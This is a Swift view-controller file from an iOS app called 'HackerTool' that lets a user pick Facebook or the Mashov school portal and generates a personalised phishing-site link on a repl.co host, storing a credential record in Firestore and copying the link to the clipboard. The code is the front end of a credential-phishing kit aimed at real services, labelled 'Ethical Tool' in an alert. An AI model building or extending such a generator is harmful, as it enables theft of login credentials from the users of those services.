//
//  CreaftPhishingSite.swift
//  HackerTool
//
//  Created by עילי בוקובזה on 02/10/2021.
//

import UIKit
import Firebase
import FirebaseFirestore
class CreatePhishingSite: UIViewController, UICollectionViewDataSource, UICollectionViewDelegate {
    
    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return 2
    }
    
    
    @IBOutlet weak var createButton: UIButton!
    @IBAction func logButton(_ sender: Any) {
    }
    
    @IBAction func createTapped(_ sender: Any) {
        Firestore.firestore().collection("websites").document(Auth.auth().currentUser!.uid as! String).setData(["new":["user":"username","password":"pass"]])
        
        let alert = UIAlertController(title: "Ethical Tool", message: "Phishing site url:\nhttps://LastPhishing.cyberproject.repl.co/facebook/\(Auth.auth().currentUser!.uid)\n (Url copied)", preferredStyle: .alert)
        alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))
        self.present(alert, animated: true, completion: nil)
        UIPasteboard.general.string = "https://LastPhishing.cyberproject.repl.co/facebook/\(Auth.auth().currentUser!.uid)"
        
    }
    @IBAction func watchLogsAction(_ sender: Any) {
        
    }
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: "phishingSite", for: indexPath) as! PhishingSiteCell
        cell.view.layer.cornerRadius = 10
        cell.icon.layer.cornerRadius = 10
        
        if indexPath.row == 0 {
            cell.icon.image = UIImage.init(named: "mashov.png")
        }
        if indexPath.row == 1 {
            cell.icon.image = UIImage.init(named: "facebook.png")
        }
        
        
        return cell
    }
    
    
    @IBOutlet weak var collectionView: UICollectionView!
    override func viewDidLoad() {
        
        self.collectionView.dataSource = self
        self.collectionView.delegate = self
        self.createButton.layer.cornerRadius = 10
        //self.logButton.layer.cornerRadius = 10
    }
}
class PhishingSiteCell: UICollectionViewCell {
    
    @IBOutlet weak var view: UIView!
    @IBOutlet weak var icon: UIImageView!
    
    @IBAction func clicked(_ sender: Any) {
        self.view.transform = CGAffineTransform(scaleX: 0.9, y: 0.9)
        self.icon.transform = CGAffineTransform(scaleX: 0.9, y: 0.9)

        
        let feedbackGenerator = UIImpactFeedbackGenerator(style: .heavy)
        feedbackGenerator.impactOccurred()
        
        UIView.animate(withDuration: 0.5, delay: 0, usingSpringWithDamping: 1, initialSpringVelocity: 6, options: .allowUserInteraction, animations: {
            self.view.transform = CGAffineTransform.identity
            self.icon.transform = CGAffineTransform.identity

            
        }, completion: nil)
        

    }
    
}
extension CreatePhishingSite: UICollectionViewDelegateFlowLayout {
    func collectionView(_ collectionView: UICollectionView, layout collectionViewLayout: UICollectionViewLayout, sizeForItemAt indexPath: IndexPath) -> CGSize {
        return CGSize(width: self.view.frame.size.width / 3, height: 100)
    }
}
